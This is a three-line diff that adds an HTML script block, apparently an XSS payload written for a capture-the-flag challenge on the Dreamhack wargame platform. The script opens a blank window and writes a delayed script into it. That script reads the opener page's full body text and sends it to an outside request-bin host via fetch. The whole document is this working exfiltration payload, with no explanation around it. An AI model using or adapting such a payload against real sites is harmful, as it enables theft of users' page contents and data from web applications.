@@ -1,0 +1,3 @@
+<script>
+open("about:blank").document.write("<script>setTimeout(()=>fetch('https://ulonims.request.dreamhack.games/?d='+encodeURIComponent(opener.document.body.innerText)),2500)<\/script>");
+</script>
